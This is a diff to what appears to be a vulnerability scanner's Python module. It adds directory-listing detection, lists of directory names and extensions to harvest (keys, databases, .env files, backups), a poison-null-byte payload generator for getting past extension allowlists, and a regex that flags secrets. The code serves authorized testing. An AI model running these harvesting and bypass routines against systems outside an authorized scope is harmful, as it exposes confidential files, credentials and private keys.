@@ -122,3 +122,93 @@ def git_reconstruct_finding(confirmed_git: list) -> dict:
         "evidence": f"exposed: {files}", "cwe": "CWE-527", "family": "git_exposure",
         "tags": ["information-disclosure", "git-exposure", "source-disclosure"], "confidence": "confirmed",
     }
+
+
+# ── Exposed-directory harvest + poison-null-byte bypass (general) ────────────────
+# Many apps expose a browsable file directory (an FTP/uploads/backup folder served as an
+# HTML index). Harvesting the linked files discloses confidential docs, source backups and
+# keys. Files whose extension is blocked (403) are commonly reachable via a poison null
+# byte that tricks the extension allowlist (`file.bak%2500.md`). All well-known techniques;
+# every access here is scope-guarded and only reported when the content is genuinely
+# sensitive (truth-first).
+DIR_CANDIDATES = ["ftp", "uploads", "upload", "files", "file", "backup", "backups",
+                  "download", "downloads", "data", "public", "static", "encryptionkeys",
+                  "attachments", "documents", "media"]
+
+# Extensions that usually indicate a raw/backup/secret file worth harvesting.
+_HARVEST_EXT = (".bak", ".old", ".backup", ".zip", ".tar", ".gz", ".sql", ".db", ".sqlite",
+                ".kdbx", ".pyc", ".key", ".pem", ".p12", ".pfx", ".yml", ".yaml", ".md",
+                ".conf", ".config", ".ini", ".env", ".json", ".log", ".gg", ".txt", ".csv")
+# Allowlisted "safe" extensions a null-byte payload appends to slip past the filter.
+_NULLBYTE_APPEND = (".md", ".txt", ".pdf")
+_HREF = re.compile(r'href=["\']([^"\']+)["\']', re.I)
+
+
+def looks_like_listing(html: str) -> bool:
+    """Heuristic: does this HTML look like a browsable directory index (file links)?"""
+    if not html:
+        return False
+    if re.search(r"index of\s*/|directory listing", html, re.I):
+        return True
+    files = [h for h in _HREF.findall(html) if "." in h.rsplit("/", 1)[-1]]
+    return len(files) >= 3
+
+
+def parse_listing(html: str) -> list:
+    """Extract file paths (with extensions) from a directory-index page."""
+    out, seen = [], set()
+    for h in _HREF.findall(html or ""):
+        h = h.strip()
+        if h.startswith(("http://", "https://", "mailto:", "#", "?", "..")):
+            continue
+        leaf = h.rsplit("/", 1)[-1]
+        if "." not in leaf or leaf in (".", ".."):
+            continue
+        p = h.lstrip("/")
+        if p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out[:100]
+
+
+def nullbyte_variants(path: str) -> list:
+    """Poison-null-byte bypass candidates for a blocked file: append an allowlisted
+    extension after an encoded null byte so the filter sees `.md` but the OS opens the
+    real file. Tries the double-encoded (%2500) and single (%00) forms."""
+    out = []
+    for enc in ("%2500", "%00"):
+        for ext in _NULLBYTE_APPEND:
+            out.append(path + enc + ext)
+    return out
+
+
+def is_harvestable(path: str) -> bool:
+    leaf = path.rsplit("/", 1)[-1].lower()
+    return leaf.endswith(_HARVEST_EXT)
+
+
+_SENSITIVE_SIG = re.compile(
+    r"confidential|do not distribute|BEGIN (?:RSA|EC|OPENSSH|PRIVATE)|password|passwd|"
+    r"secret|api[_-]?key|\"name\":\s*\"|coupon|salary|acquisition|kdbx|private key|"
+    r"aws_access_key|-----BEGIN", re.I)
+
+
+def harvest_finding(url: str, path: str, via_nullbyte: bool, snippet: str) -> dict:
+    how = "a poison-null-byte extension bypass" if via_nullbyte else "direct request"
+    return {
+        "title": f"Exposed sensitive file: {path.rsplit('/', 1)[-1]}"
+                 + (" (null-byte bypass)" if via_nullbyte else ""),
+        "severity": "high", "target": url, "family": "backup_exposure",
+        "description": (f"A sensitive file in a browsable directory was retrieved via {how}. "
+                        "Exposed backup/source/key/document files leak confidential data and "
+                        "often credentials or source history."),
+        "impact": "Disclosure of confidential documents, source backups, or secret keys.",
+        "reproduction_steps": [f"Request {url}",
+                               "Observe the sensitive file content is served"]
+                              + (["(the plain path is blocked; the null byte defeats the extension allowlist)"]
+                                 if via_nullbyte else []),
+        "evidence": (snippet or "")[:300], "cwe": "CWE-552",
+        "family": "backup_exposure", "tags": ["information-disclosure", "exposed-file"]
+                  + (["poison-null-byte"] if via_nullbyte else []),
+        "confidence": "confirmed",
+    }
